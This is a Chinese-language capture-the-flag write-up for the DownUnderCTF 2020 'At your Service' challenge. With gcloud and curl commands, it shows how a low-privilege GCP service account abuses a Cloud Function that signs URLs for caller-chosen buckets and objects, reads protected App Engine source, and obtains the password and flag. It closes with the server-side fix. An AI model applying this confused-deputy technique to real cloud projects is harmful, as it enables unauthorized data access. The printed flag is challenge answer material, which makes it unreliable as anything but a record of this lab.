# DownUnderCTF 2020 - At your Service

## 题目简述

题目给出一个只接受正确 password 的 App Engine 页面，以及一份低权限 GCP service account key `cory.json`。该身份只能枚举部分 Cloud Storage 和 Cloud Functions 资源，不能直接读取保存 App Engine 源码的对象。真正的攻击面是另一项 Cloud Function：它以权限更高的 service account 运行，并允许调用者控制要签名的 bucket 与 object，从而形成身份到资源的权限代理。

## 解题过程

### 建立最小权限图

先把题目提供的身份加载到独立的 gcloud configuration，再确认当前账号与项目：

```bash
gcloud auth activate-service-account --key-file cory.json
gcloud auth list
gcloud config get-value project
```

Terraform 源码和实际枚举结果表明，`cory` 具备两组关键权限：

- `storage.buckets.list`、`storage.objects.list`：能看见 bucket 和对象名，但没有 `storage.objects.get`；
- Cloud Functions 的 get、list、sourceCodeGet 与 invoke：能发现、调用并下载函数源码。

因此 `gsutil ls` 能定位保存 App Engine 源码的 `app-engine-src-*` bucket，但直接执行下面的读取会返回 403：

```bash
gsutil cp gs://app-engine-src-*/index.js .
```

这次拒绝很重要，它说明应继续寻找拥有 object read 权限的另一个身份，而不是把“能列举”误认为“能读取”。

### 下载 Cloud Function 源码

枚举函数并使用题目部署区域查询详情：

```bash
gcloud functions list
gcloud functions describe professional-signer \
    --region australia-southeast1
```

`professional-signer` 需要认证调用，并以 `tracy-worker` service account 运行。调用 Cloud Functions 控制面下载源码时使用 OAuth access token：

```bash
ACCESS_TOKEN=$(gcloud auth print-access-token)
curl -X POST \
  "https://cloudfunctions.googleapis.com/v1/projects/<PROJECT>/locations/australia-southeast1/functions/professional-signer:generateDownloadUrl" \
  -H "Authorization: Bearer $ACCESS_TOKEN"
```

响应中的临时下载地址指向函数源代码。核心逻辑如下：

```javascript
exports.signURL = async (req, res) => {
  if (!req.query.b || !req.query.o) {
    return res.status(400).json({message: "Missing query parameters"});
  }

  const [url] = await storage
    .bucket(req.query.b)
    .file(req.query.o)
    .getSignedUrl({
      version: "v4",
      action: "read",
      expires: Date.now() + 15 * 60 * 1000,
    });

  res.json({message: "Success!", signedURL: url});
};
```

函数没有把 `b` 和 `o` 限制在预期资源中，而它的运行身份 `tracy-worker` 恰好拥有源码 bucket 的 `roles/storage.objectViewer`。于是低权限调用者可以借它生成自己本来无权生成的读签名。

### 借高权限函数读取 App Engine 源码

调用 HTTPS 函数本身需要 audience 匹配的 identity token，而不是前面用于控制面 API 的 access token：

```bash
IDENTITY_TOKEN=$(gcloud auth print-identity-token)
curl -G "<FUNCTION_HTTPS_URL>" \
  -H "Authorization: Bearer $IDENTITY_TOKEN" \
  --data-urlencode 'b=app-engine-src-tf' \
  --data-urlencode 'o=index.js'
```

访问返回的短期 signed URL 后，App Engine 的认证逻辑暴露出来：

```javascript
if (req.body.password === "https://www.youtube.com/watch?v=lnigc08J6FI") {
  res.status(200).send(process.env.FLAG);
} else {
  res.status(401).send("Bad password");
}
```

把该字符串作为 password 提交，得到：

```text
DUCTF{and_thats_the_way_its_gonna_be_little_darling_we'll_be_riding_on_the_horses_YEAAAAAAAAAAAAAAAAAAAAYEAAAAAAAAAAAAAAAAAAAAH}
```

原 writeup 中的函数地址、源码下载 URL 和 token 都是比赛期间的临时值，正文只保留 API 形态与占位符，避免把过期凭据当成可复现条件。

## 方法总结

- 核心技巧：画出 `cory -> Cloud Function -> tracy-worker -> Storage object` 的权限链，利用可控资源参数把高权限签名函数变成 confused deputy。
- 识别信号：service account 能列举但不能读取对象、同时能查看/调用 serverless function 时，应检查函数运行身份和输入是否能选择任意资源。
- 复用要点：access token 用于 GCP 控制面授权，identity token 用于受 IAM 保护的 HTTPS 函数调用；signed URL 继承的是签名身份的对象权限，必须在服务端固定允许的 bucket/object 范围。
